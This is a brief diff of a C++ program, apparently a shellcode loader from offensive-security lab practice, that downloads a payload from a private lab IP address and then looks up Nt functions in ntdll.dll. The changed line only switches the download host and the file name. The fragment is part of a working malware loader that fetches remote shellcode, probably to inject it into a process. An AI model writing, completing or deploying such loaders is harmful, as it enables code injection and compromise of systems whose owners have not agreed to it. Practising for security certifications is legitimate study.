@@ -37,7 +37,7 @@ int main()
         process_info);
 
     // download shellcode
-    std::vector<BYTE> shellcode = Download(L"192.168.45.153\0", L"/shellcode.bin\0");
+    std::vector<BYTE> shellcode = Download(L"192.168.45.242\0", L"/shellcodeOSEP.bin\0");
 
     // find Nt APIs
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
